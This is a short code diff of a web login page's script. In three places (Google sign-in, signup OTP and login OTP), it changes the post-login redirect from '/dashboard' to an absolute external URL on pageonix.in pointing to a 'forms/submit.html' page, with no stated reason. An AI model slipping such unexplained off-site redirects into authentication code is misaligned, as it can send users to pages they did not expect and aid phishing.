@@ -436,7 +436,7 @@
                 .then(r => r.json())
                 .then(data => {
                     toggleLoading(false, 'googleProcessing');
-                    if (data.status === 'success') window.location.href = '/dashboard';
+                    if (data.status === 'success') window.location.href = 'https://pageonix.in/home/pages/forms/submit.html';
                     else showError('googleError', data.message);
                 })
                 .catch(() => {
@@ -520,7 +520,7 @@
                 .then(data => {
                     if (data.status === 'success') {
                         showSuccess('otpSuccess', 'Verified! Redirecting...');
-                        setTimeout(() => window.location.href = '/dashboard', 1000);
+                        setTimeout(() => window.location.href = 'https://pageonix.in/home/pages/forms/submit.html', 1000);
                     } else showError('otpError', data.message);
                 });
         }
@@ -560,7 +560,7 @@
                 .then(data => {
                     if (data.status === 'success') {
                         showSuccess('loginOtpSuccess', 'Verified! Redirecting...');
-                        setTimeout(() => window.location.href = '/dashboard', 1000);
+                        setTimeout(() => window.location.href = 'https://pageonix.in/home/pages/forms/submit.html', 1000);
                     } else showError('loginOtpError', data.message);
                 });
         }
